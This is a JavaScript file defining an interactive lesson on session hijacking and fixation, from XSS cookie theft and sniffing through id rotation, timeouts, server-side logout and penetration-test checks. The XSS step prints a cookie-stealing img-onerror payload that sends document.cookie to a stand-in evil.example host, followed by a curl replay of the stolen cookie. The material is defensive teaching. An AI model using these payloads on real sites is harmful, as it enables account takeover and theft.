(function () {
  const { block, device, db, zone, card, link, both, flow, rt, red, green, amber, gray, note, bad, good, warn } = SD;

  const alice = (tags = [], o = {}) => device(0, -18, Object.assign({ label: "Alice", tags }, o));
  const bank = (tags = [], o = {}) => block(0, -2, Object.assign({ label: ["Bank", "App"], glyph: "bank", tags }, o));
  const store = (tags = [], o = {}) => db(0, 12, Object.assign({ label: "sessions", glyph: "key", tags }, o));
  const attacker = (tags = [], o = {}) => device(14, 6, Object.assign({ label: "attacker", labelIcon: "skull", screen: "red", tags }, o));
  const low = (dx = -95, dy = 100) => ({ x: 0, y: -2, dx, dy });
  const high = (dx = -430, dy = -220) => ({ x: 0, y: -2, dx, dy });

  const ask = (label, o = {}) => both("alice", "app", Object.assign({ label, labelAt: 0.5, labelSide: "below" }, o));
  const lookup = (o = {}) => both("app", "store", o);
  const replay = (label, o = {}) => link("attacker", "app", Object.assign({ label, labelTone: "red", tone: "red", labelAt: 0.5 }, o));
  const refused = (label) => replay(label, { fail: 0.75, labelAt: 0.48, labelSide: "below" });
  const base = (label, extra = {}) => Object.assign({ aa: ask(label), as: lookup() }, extra);

  SD.lesson({
    id: "session-fixation-and-session-hijacking",
    title: "Session Fixation and Session Hijacking",
    summary: "Whoever presents a live session id is the user: how attackers steal one, guess one or plant one before login, and the server-side controls that close each route.",
    minutes: 14,
    level: "intermediate",
    metrics: [
      { id: "holder", label: "Live id held by", icon: "key" },
      { id: "gets", label: "Attacker can", icon: "unlock" },
      { id: "defense", label: "Defense", icon: "shield" },
    ],
    legend: [["mine", "Alice"], ["secret", "session id / data"], ["poison", "attacker"], ["res", "response"], ["ping", "guess / probe"]],
    goals: [
      { text: "What the server does with a session id", step: 0 },
      { text: "Stealing a live id: XSS, sniffing, URL leaks", step: 1 },
      { text: "Why ids need 128 bits from a CSPRNG", step: 4 },
      { text: "How fixation plants an id before login", step: 5 },
      { text: "Rotating the id on login and privilege change", step: 6 },
      { text: "Timeouts, real logout and re-authentication", step: 7 },
    ],
    steps: [
      {
        short: "Server session",
        chapter: "setup",
        title: "A session is a random id the server looks up",
        body: [
          "Alice posts her password to <code>/login</code> once. The bank checks it, generates a random <span class=\"term\">session id</span>, and saves a record under that id in its session store: <code>sess:8f2c9a... = {user: \"alice\", mfa: true}</code>. Her browser only ever gets the id, in <code>Set-Cookie: sid=8f2c9a...</code>.",
          "Every later request carries the cookie, and the server does one lookup: find the record, read <code>user: \"alice\"</code>, serve the page. It doesn't check who sent the id or from where. So anyone who presents a live id is treated as Alice until the record is gone, and the rest of this lesson is about keeping that id secret, unguessable, short-lived and properly dead after logout.",
        ],
        callout: { kind: "insight", text: "A session id is a <b>bearer credential</b>. Once Alice has logged in it stands for her password and her MFA code, so it's worth at least as much as both." },
        metrics: { holder: "Alice only", gets: "-", defense: "-" },
        scene: {
          entities: {
            alice: alice([note("cookie: sid=8f2c9a...", "cookie")]),
            app: bank([green("record found: alice", "userCheck")]),
            store: store([note("8f2c... = {user: alice}", "key")]),
            card: card(low(), "Server-side session", ["POST /login  user=alice&pw=...", "<- Set-Cookie: sid=8f2c9a...", "GET /account  Cookie: sid=8f2c9a...", "= server: sessions.get(sid) -> alice", "# no check on who sent it, or from where"], { icon: "key" }),
          },
          links: base("GET /account + cookie", { as: lookup({ label: "sessions.get(sid)", labelAt: 0.5 }) }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.8, back: "res" }), flow("aa", "secret", { rate: 0.35, reverse: true, delay: 1 })],
        },
      },
      {
        short: "XSS theft",
        chapter: "attack",
        title: "Theft through XSS: one line of script ships the id out",
        body: [
          "Say the payee nickname field has a stored XSS bug and the session cookie was set without <code>HttpOnly</code>. The injected script runs in Alice's tab and sends the cookie out: <code>new Image().src = 'https://evil.example/c?' + document.cookie</code>. A second later the attacker's server logs <code>sid=8f2c9a...</code>.",
          "The attacker sends that value from their own machine, with <code>curl -H 'Cookie: sid=8f2c9a...'</code> or a cookie editor. The bank's lookup finds Alice's record and serves her account: no password prompt, no MFA, because the session already passed both. Taking over a session that's already authenticated like this is <span class=\"term\">session hijacking</span>.",
        ],
        callout: { kind: "warn", text: "<code>HttpOnly</code>, from the cookie lesson, stops the read and nothing else. The script can still act as Alice inside her tab; it just can't carry the id off to use later." },
        changes: ["- XSS reads document.cookie", "- sid sent to evil.example", "- Attacker replays it from another machine"],
        metrics: { holder: bad("Alice + attacker"), gets: bad("full account"), defense: bad("none") },
        scene: {
          entities: {
            alice: alice([red("runs injected <script>", "code")], { screen: "red" }),
            app: bank([red("same id, so it's alice", "userX")]),
            store: store([note("8f2c... = {user: alice}", "key")]),
            attacker: attacker([red("pastes it into curl", "terminal")]),
            card: card(high(), "Stolen in one line", ["<img src=x onerror=\"new Image().src=", "  'https://evil.example/c?'+document.cookie\">", "! evil.example log: sid=8f2c9a...", "! curl -H 'Cookie: sid=8f2c9a...' /account", "= HttpOnly hides it from document.cookie"], { icon: "code" }),
          },
          links: base("GET /payees", {
            ex: link("alice", "attacker", { style: "dashed", tone: "red", label: "document.cookie", labelTone: "red", labelAt: 0.62 }),
            xa: replay("Cookie: sid=8f2c9a..."),
          }),
          flows: [rt("aa", "mine", { rate: 0.6, back: "poison" }), flow("ex", "secret", { rate: 0.6, delay: 0.8 }), rt(["xa", "as"], "poison", { rate: 0.5, back: "secret", delay: 1.4 })],
        },
      },
      {
        short: "Sniffed on HTTP",
        chapter: "attack",
        title: "Sniffed on plain HTTP: the coffee-shop Wi-Fi case",
        body: [
          "In 2010 a Firefox extension called <b>Firesheep</b> turned this into a point-and-click attack. Facebook, Twitter and plenty of others used HTTPS for the login form, then served the rest of the site over plain HTTP, so the session cookie crossed open Wi-Fi in clear text on every request. Anyone on the same network saw a list of names and could double-click one to become that person.",
          "The mechanism hasn't changed. One request over <code>http://</code>, from an old bookmark, a typed address or a mixed-content image, carries the cookie if it lacks <code>Secure</code>, and anyone running <code>tcpdump</code> on the same open network reads it off the air. The fixes come from the cookie and TLS lessons: <code>Secure</code> on the cookie, HTTPS on every page, and HSTS so the browser never tries plain HTTP first.",
        ],
        callout: { kind: "tip", text: "TLS on the login page only was the 2010 mistake. After login the id is worth more than the password, so it needs encryption on every request too." },
        changes: ["- One request goes over http://", "- Cookie lacks Secure, sent in clear", "- Attacker on the same Wi-Fi copies it"],
        metrics: { holder: bad("Alice + Wi-Fi sniffer"), gets: bad("full account"), defense: bad("TLS on /login only") },
        scene: {
          entities: {
            wifi: zone([-5, 23, -24, -8], "open coffee-shop Wi-Fi", "red"),
            alice: alice([amber("old bookmark, no HSTS", "link")]),
            app: bank([red("sid valid: serves alice", "userX")]),
            store: store([note("8f2c... = {user: alice}", "key")]),
            attacker: attacker([red("tcpdump on the same AP", "wifi")], { x: 19, y: -12 }),
            card: card(high(), "What the sniffer sees", ["GET /account HTTP/1.1", "Host: bank.example", "! Cookie: sid=8f2c9a...", "# Firesheep 2010: HTTPS for login only", "= Secure + HTTPS everywhere + HSTS"], { icon: "wifi" }),
          },
          links: base("GET http://bank.example/", {
            sn: link("alice", "attacker", { style: "dashed", tone: "red", label: "captures frames", labelTone: "red", labelAt: 0.55 }),
            xa: replay("Cookie: sid=8f2c9a...", { labelAt: 0.58 }),
          }),
          flows: [rt("aa", "mine", { rate: 0.6 }), flow("sn", "secret", { rate: 0.7, delay: 0.5 }), rt(["xa", "as"], "poison", { rate: 0.5, back: "secret", delay: 1.3 })],
        },
      },
      {
        short: "Ids in URLs",
        chapter: "attack",
        title: "Ids in URLs leak everywhere the URL goes",
        body: [
          "Some apps carry the id in the URL, usually as a fallback for browsers with cookies off: Java servlet containers rewrite links to <code>/account;jsessionid=8F2C9A...</code>, and older PHP apps append <code>?PHPSESSID=</code>. A URL is the least private part of a request. It lands in the server's access log, in every proxy and load balancer log on the way, in browser history, and in whatever Alice pastes into a support chat.",
          "It can also leave in the <code>Referer</code> header when the page loads a third-party script or Alice clicks an outbound link. Modern browsers default to <code>strict-origin-when-cross-origin</code>, which trims that to the bare origin, but logs and pasted links still keep the full URL. Switch URL rewriting off (<code>&lt;tracking-mode&gt;COOKIE&lt;/tracking-mode&gt;</code> in <code>web.xml</code>, <code>session.use_only_cookies=1</code> and <code>session.use_trans_sid=0</code> in PHP), and don't log raw <code>Cookie</code> headers either.",
        ],
        callout: { kind: "warn", text: "Logs are the quiet leak. Anyone with read access to them, from the SIEM team to a compromised log shipper, can become any user whose id was written there." },
        changes: ["- sid rewritten into every link", "- Access logs and history keep it", "- A pasted URL hands over the session"],
        metrics: { holder: bad("anyone who sees the URL"), gets: bad("full account"), defense: bad("URL rewriting on") },
        scene: {
          entities: {
            alice: alice([amber("pastes the URL into chat", "message")]),
            app: bank([red("accepts ;jsessionid=", "link")]),
            store: store([note("8f2c... = {user: alice}", "key")]),
            logs: block(11, -7, { s: 3.6, h: 34, label: ["access", "logs"], glyph: "scroll", color: "gray", pills: "below", tags: [red("...;jsessionid=8F2C9A... 200", "scroll")] }),
            attacker: attacker([red("reads logs, history, chat", "eye")]),
            card: card(high(), "Where the URL ends up", ["GET /account;jsessionid=8F2C9A...", "! access log, proxy log, LB log", "! browser history, bookmarks", "! pasted into support chat", "! Referer (trimmed by default today)", "= cookies only; no URL rewriting"], { icon: "link" }),
          },
          links: base("GET /account;jsessionid=8F2C...", {
            al: link("app", "logs"),
            lx: link("logs", "attacker", { style: "dashed", tone: "red", label: "grep jsessionid", labelTone: "red", labelAt: 0.5 }),
            xa: replay("", { style: "dashed" }),
          }),
          flows: [rt("aa", "mine", { rate: 0.6 }), flow("al", "secret", { rate: 0.6, delay: 0.4 }), flow("lx", "secret", { rate: 0.5, delay: 1 }), rt(["xa", "as"], "poison", { rate: 0.4, back: "secret", delay: 1.6 })],
        },
      },
      {
        short: "Guessable ids",
        chapter: "problem",
        title: "Predictable ids get guessed, not stolen",
        body: [
          "If stealing fails, the attacker can try computing an id. Homegrown schemes still turn up: an auto-increment counter (<code>sid=10452</code>, so try <code>10451</code>), <code>md5(username + login_time)</code>, or <code>Math.random()</code>, whose internal state can be recovered from a handful of outputs. Each one turns hijacking into arithmetic: generate candidates, send them, and watch for a <code>200</code> instead of a redirect to <code>/login</code>.",
          "Use the framework's session generator, or draw at least 128 bits from a CSPRNG yourself: <code>crypto.randomBytes(16)</code> in Node, <code>secrets.token_urlsafe(32)</code> in Python. With a million live sessions, each guess then has about a 1 in 2<sup>108</sup> chance, which no botnet will ever work through. Length isn't entropy, though: a 32-character MD5 of a username and a login time is only as random as the attacker's uncertainty about that second.",
        ],
        callout: { kind: "tip", text: "Burp Sequencer collects thousands of fresh ids and estimates their effective entropy in bits. A result far below the id's length is a finding even if nobody has guessed one yet." },
        changes: ["- Ids follow a pattern", "- Attacker enumerates candidates", "+ 128+ bits from a CSPRNG"],
        metrics: { holder: bad("whoever guesses right"), gets: bad("random users' accounts"), defense: warn("homegrown ids") },
        scene: {
          entities: {
            alice: alice([note("her id: 10452", "cookie")]),
            app: bank([red("sid=10448: 200 OK", "alert")]),
            store: store([note("10451 bob, 10452 alice", "table")]),
            attacker: attacker([red("loops sid-- until a 200", "refresh")]),
            card: card(low(), "Guessable vs random", ["! sid=10452                  counter", "! md5(\"alice\" + 1731911520)   time-based", "! Math.random()               state leaks", "= crypto.randomBytes(16)      128 bits", "# 1M sessions: 1 in 2^108 per guess"], { icon: "hash" }),
          },
          links: base("GET /account", { xa: replay("sid=10451, 10450, ...") }),
          flows: [rt("aa", "mine", { rate: 0.6 }), rt("xa", "ping", { rate: 1.6, back: "empty" }), rt(["xa", "as"], "poison", { rate: 0.3, back: "secret", delay: 1.2 })],
        },
      },
      {
        short: "Fixation",
        chapter: "attack",
        title: "Fixation: plant an id first, let Alice log it in",
        body: [
          "<span class=\"term\">Session fixation</span> skips the theft. The attacker opens the bank's login page, receives a fresh anonymous id, <code>sid=a71f...</code>, and makes Alice's browser use the same one: a link to <code>/login?sid=a71f...</code> on an app that accepts ids from the URL, or a cookie tossed from a sibling subdomain they control, <code>Set-Cookie: sid=a71f...; Domain=bank.example</code>.",
          "Alice logs in with her real password and MFA. The vulnerable app writes <code>user: \"alice\"</code> into the existing record and keeps the id, which the attacker has known all along. Their next request with <code>sid=a71f...</code> is Alice's, and hiding the cookie doesn't help because they never needed to read it.",
        ],
        callout: { kind: "insight", text: "Interview line: hijacking takes an id <b>after</b> login, fixation chooses it <b>before</b> login. Different timing, so a different fix." },
        changes: ["- Attacker gets a pre-login id", "- Alice's browser is made to use it", "- Login keeps the same id"],
        metrics: { holder: bad("Alice + attacker (planted)"), gets: bad("full account"), defense: bad("id kept at login") },
        scene: {
          entities: {
            alice: alice([amber("logs in with password + MFA", "logIn")]),
            app: bank([red("login ok, same id kept", "alert")]),
            store: store([red("a71f... = {user: alice}", "key")]),
            attacker: attacker([red("knew a71f... before login", "clock")]),
            card: card(high(), "Planting the id", ["1. attacker: GET /login -> sid=a71f...", "2. link: bank.example/login?sid=a71f...", "   or promo.bank.example tosses", "   sid=a71f...; Domain=bank.example", "3. Alice logs in; record keeps a71f...", "! 4. attacker sends sid=a71f... too"], { icon: "crosshair" }),
          },
          links: base("POST /login", {
            ma: link("attacker", "alice", { style: "dashed", tone: "red", label: "/login?sid=a71f...", labelTone: "red", labelAt: 0.5 }),
            xa: replay("Cookie: sid=a71f..."),
          }),
          flows: [flow("ma", "poison", { rate: 0.5 }), rt(["aa", "as"], "mine", { rate: 0.5, delay: 0.8 }), rt(["xa", "as"], "poison", { rate: 0.5, back: "secret", delay: 1.6 })],
        },
      },
      {
        short: "Rotate on login",
        chapter: "solution",
        title: "Issue a new id at login and at every privilege change",
        body: [
          "Throw the old id away whenever the authentication state changes. At login, copy what you need from the anonymous session (a basket, a language setting), delete the old record and issue a brand-new id. The attacker's <code>a71f...</code> now points at nothing, and Alice holds <code>c03e...</code>, which they've never seen.",
          "Frameworks do this if you use their login call: Django's <code>login()</code> calls <code>cycle_key()</code>, Spring Security changes the id by default, PHP needs <code>session_regenerate_id(true)</code> and Express needs <code>req.session.regenerate()</code>. Rotate again on privilege changes such as entering admin mode or changing the password. Also reject ids the server never issued (<code>session.use_strict_mode=1</code> in PHP), and name the cookie with the <code>__Host-</code> prefix so a subdomain can't toss one in.",
        ],
        callout: { kind: "tip", text: "Hand-written login handlers are where this breaks. If you see <code>session.user = user</code> with no regenerate call next to it, test for fixation first." },
        changes: ["+ New id issued at login", "+ Old record deleted", "~ Planted id now points at nothing", "+ __Host- prefix blocks tossing"],
        metrics: { holder: good("Alice only (new id)"), gets: good("nothing"), defense: good("rotate on login") },
        scene: {
          entities: {
            alice: alice([green("now holds sid=c03e...", "cookie")]),
            app: bank([green("regenerate() at login", "refresh")]),
            store: store([green("a71f... deleted", "key")]),
            attacker: attacker([gray("planted id is dead", "ban")]),
            card: card(low(), "Rotate on auth changes", ["Django   login() -> cycle_key()", "Spring   changeSessionId (default)", "PHP      session_regenerate_id(true)", "Express  req.session.regenerate(cb)", "= again on role change, sudo, password", "= __Host-sid: subdomains can't set it"], { icon: "refresh" }),
          },
          links: base("POST /login -> new sid", { xa: refused("Cookie: sid=a71f...") }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.6, back: "secret" }), flow("xa", "poison", { rate: 0.5, delay: 1, blocked: true })],
        },
      },
      {
        short: "Timeouts",
        chapter: "solution",
        title: "Idle and absolute timeouts, enforced on the server",
        body: [
          "A stolen id is only worth something while its record lives. Keep two timestamps in the record and check both on every request: an <span class=\"term\">idle timeout</span> (say 15 minutes with no activity) and an <span class=\"term\">absolute timeout</span> (say 8 hours after login, however busy the session is). When either trips, delete the record and send the user back to log in.",
          "You need both. An idle timeout alone can be held open forever: an attacker's script that requests <code>/account</code> every five minutes keeps resetting it, and the absolute cap is what finally ends that. The check also has to run on the server, because the cookie's <code>Max-Age</code> only tells Alice's browser when to forget the id, while the attacker's <code>curl</code> sends it whenever they like.",
        ],
        callout: { kind: "warn", text: "\"Our cookie expires after 15 minutes\" isn't a session timeout. If the server keeps the record for 30 days, a replayed id works for 30 days." },
        changes: ["+ last_seen and created_at in the record", "+ Idle 15 min, absolute 8 h", "~ Old stolen ids expire"],
        metrics: { holder: warn("attacker, until expiry"), gets: warn("a shrinking window"), defense: good("idle + absolute") },
        scene: {
          entities: {
            alice: alice([gray("signs in again after 8 h", "logIn")]),
            app: bank([green("8 h since login: 401", "timer")]),
            store: store([note("created 09:02, seen 17:01", "clock")]),
            attacker: attacker([red("pings /account every 5 min", "refresh")]),
            card: card(low(), "Two clocks, checked server-side", ["if now - last_seen  > 15 min: expire", "if now - created_at > 8 h:   expire", "! cookie Max-Age is only a browser hint"], {
              icon: "timer",
              bars: [
                { label: "idle 15 min", to: 0.3, tone: "amber", note: "resets on use" },
                { label: "absolute 8 h", to: 1, tone: "red", note: "hard stop", bold: true },
              ],
            }),
          },
          links: base("GET /account", { xa: refused("sid=8f2c... (9 h old)") }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.6 }), flow("xa", "poison", { rate: 0.6, delay: 0.8, blocked: true })],
        },
      },
      {
        short: "Real logout",
        chapter: "solution",
        title: "Logout must delete the session on the server",
        body: [
          "Plenty of logout handlers do only this: <code>Set-Cookie: sid=; Max-Age=0</code>. Alice's browser forgets the id and the page says she's signed out, but the record in the store is untouched. Every copy of the id, whether it came from XSS, a log file or a sniffed request, keeps working until it times out.",
          "Real logout deletes the record first: <code>req.session.destroy()</code>, <code>session_destroy()</code>, or Django's <code>logout()</code>, which flushes it. Then clear the cookie, optionally with <code>Clear-Site-Data: \"cookies\"</code>. Keep an index from user to session ids so \"sign out everywhere\" and password changes can kill every session, which stateless JWTs can't do without short lifetimes or a denylist.",
        ],
        callout: { kind: "tip", text: "Quick test: copy the cookie, click Sign out, then replay the old cookie from Burp Repeater. A <code>200</code> means logout is cosmetic." },
        changes: ["- Cookie cleared, record kept (the bug)", "+ Record deleted on logout", "+ Sign out everywhere via a user index"],
        metrics: { holder: good("nobody"), gets: good("nothing after logout"), defense: good("server-side destroy") },
        scene: {
          entities: {
            alice: alice([note("clicked Sign out", "door")]),
            app: bank([green("destroy(), then clear cookie", "shieldCheck")]),
            store: store([green("record gone", "key")]),
            attacker: attacker([gray("copied id now gets 401", "ban")]),
            card: card(low(), "Logout, done right", ["! Set-Cookie: sid=; Max-Age=0  (alone)", "= DEL sess:8f2c... in the store", "= Clear-Site-Data: \"cookies\"", "= sign out everywhere: user -> [sids]", "# JWTs: short exp or a denylist"], { icon: "door" }),
          },
          links: base("POST /logout", {
            as: lookup({ label: "DEL sess:8f2c...", labelAt: 0.5 }),
            xa: refused("Cookie: sid=8f2c... (copied)"),
          }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.5 }), flow("xa", "poison", { rate: 0.5, delay: 1.2, blocked: true })],
        },
      },
      {
        short: "Bind & re-auth",
        chapter: "tradeoff",
        title: "Binding to IP or device, and asking again for risky actions",
        body: [
          "A tempting extra layer is to store the login IP and User-Agent in the session and reject any request that doesn't match. The User-Agent stops almost nothing, since malware that steals the cookie copies the browser's UA string too. IP binding logs phones out every time they hop from Wi-Fi to LTE, breaks for users behind rotating corporate proxies, and still misses the coffee-shop attacker, who shares Alice's public IP through the same NAT.",
          "Scoring signals works better than hard pins: a session that suddenly shows up from a new country, ASN or device gets sent back through login. Then put <span class=\"term\">re-authentication</span> in front of the actions that matter, such as changing the email or password, adding a payee or exporting data, the way GitHub's sudo mode asks for your password again. A stolen session can then look around, but it can't lock Alice out or move her money.",
        ],
        callout: { kind: "insight", text: "Stolen cookies skip MFA, which is why infostealer malware harvests them in bulk. The 2023 takeover of the Linus Tech Tips YouTube channels started with a stolen session token, not a password." },
        changes: ["~ IP and UA binding: weak and brittle", "+ Risk signals force a fresh login", "+ Re-auth before email, password, payee"],
        metrics: { holder: warn("attacker (stolen)"), gets: warn("look, not take over"), defense: good("step-up re-auth") },
        scene: {
          entities: {
            alice: alice([note("asked for password + MFA", "fingerprint")]),
            app: bank([green("sensitive: re-auth first", "lock")]),
            store: store([amber("new ASN mid-session: flag", "radar")]),
            attacker: attacker([red("same UA string, new ASN", "globe")]),
            card: card(low(), "Signals beat hard pins", ["! User-Agent: copied with the cookie", "! IP pin: breaks on Wi-Fi -> LTE", "! coffee-shop attacker shares the NAT IP", "= flag new country, ASN or device", "= re-auth: email, password, payee", "# GitHub sudo mode does this"], { icon: "radar" }),
          },
          links: base("POST /settings/email", { xa: refused("POST /payees (stolen sid)") }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.5 }), flow("xa", "poison", { rate: 0.5, delay: 0.9, blocked: true })],
        },
      },
      {
        short: "VAPT checks",
        chapter: "technique",
        title: "Testing session handling in a VAPT",
        body: [
          "Use two browsers and Burp, with test accounts. For fixation, note the <code>sid</code> before login, log in and compare: the same value afterwards is the finding. Then send an id the server never issued, <code>sid=attacker123</code>, see whether it's accepted and later authenticated, and repeat the comparison across role changes, password changes and switches into admin mode.",
          "For hijacking, replay a captured cookie from the second browser after logout, after the idle window and after the absolute cap; each replay should fail. Run Burp Sequencer on a few thousand fresh ids, look through proxy history and any logs you're given for ids in URLs, and check the cookie's <code>HttpOnly</code>, <code>Secure</code> and prefix. You're proving the gap with your own sessions, never taking over a real user's.",
        ],
        callout: { kind: "tip", text: "Write the finding as a timeline: id before login, id after login, the replayed request from the other browser and its response code. That evidence chain convinces a reviewer faster than a severity label." },
        changes: ["+ Pre- and post-login id compared", "+ Replays after logout and timeouts", "+ Sequencer run on fresh ids"],
        metrics: { holder: warn("tester's two browsers"), gets: "evidence, not access", defense: good("verified") },
        scene: {
          entities: {
            alice: alice([note("test user, sid noted", "clipboard")], { label: "browser A" }),
            app: bank([amber("same sid after login?", "search")]),
            store: store([note("record deleted on logout?", "key")]),
            attacker: attacker([note("Repeater: replays old sid", "terminal")], { label: "browser B", labelIcon: "bug", screen: "blue" }),
            card: card(low(), "Session test checklist", ["1. sid before login == after?   fixation", "2. sid=attacker123 accepted?     strict mode", "3. replay after logout           401?", "4. replay after idle, absolute   401?", "5. Sequencer: effective entropy", "6. ids in URLs or logs; cookie flags"], { icon: "listChecks" }),
          },
          links: base("login, compare sid", { xa: replay("replay old sid", { tone: "ink", labelTone: "gray" }) }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.5 }), rt("xa", "ping", { rate: 1.2, back: "empty", delay: 0.6 })],
        },
      },
      {
        short: "Recap",
        chapter: "recap",
        title: "Recap: keep the id secret, random, fresh and killable",
        body: [
          `<table class="compare">
            <thead><tr><th>Threat</th><th>How the id is lost</th><th>Fix</th></tr></thead>
            <tbody>
              <tr><td>XSS theft</td><td>Injected script reads the cookie</td><td>HttpOnly, and fix the XSS</td></tr>
              <tr><td>Sniffing</td><td>Cookie sent over <code>http://</code></td><td>Secure, HTTPS everywhere, HSTS</td></tr>
              <tr><td>URL leaks</td><td><code>;jsessionid=</code> in logs, history</td><td>Cookies only, no URL rewriting</td></tr>
              <tr><td>Prediction</td><td>Patterned or low-entropy ids</td><td>128+ bits from a CSPRNG</td></tr>
              <tr><td>Fixation</td><td>Id planted before login</td><td>Rotate on login and privilege change, <code>__Host-</code></td></tr>
              <tr><td>Old copies</td><td>Record outlives its use</td><td>Idle + absolute timeouts, server-side logout</td></tr>
              <tr><td>Stolen anyway</td><td>Infostealer, pass-the-cookie</td><td>Risk signals, re-auth for sensitive actions</td></tr>
            </tbody>
          </table>`,
          "Interview shortcut: a session id is a bearer credential, so whoever holds it is the user. Hijacking steals a live id (XSS, sniffing, URL leaks, guessing); fixation plants one before login. Rotate on login, keep ids random and out of URLs, expire and destroy them on the server, and re-authenticate before anything that could lock the user out.",
        ],
        callout: { kind: "next", text: "Next: <b>CORS and the same-origin policy</b>. The browser keeps sending Alice's session cookie on cross-origin requests; the same-origin policy decides whether another site can read the reply, and CORS is how you loosen that, sometimes much too far." },
        metrics: { holder: good("Alice only"), gets: good("nothing useful"), defense: good("layered") },
        scene: {
          entities: {
            alice: alice([green("__Host-sid, rotated at login", "shieldCheck")]),
            app: bank([green("rotate, expire, destroy", "shieldCheck")]),
            store: store([green("records die on time", "timer")]),
            attacker: attacker([gray("old ids get 401", "ban")]),
          },
          links: base("GET /account", { xa: refused("replayed sid") }),
          flows: [rt(["aa", "as"], "mine", { rate: 0.8, back: "res" }), flow("xa", "poison", { rate: 0.4, delay: 1, blocked: true })],
        },
      },
    ],
  });
})();
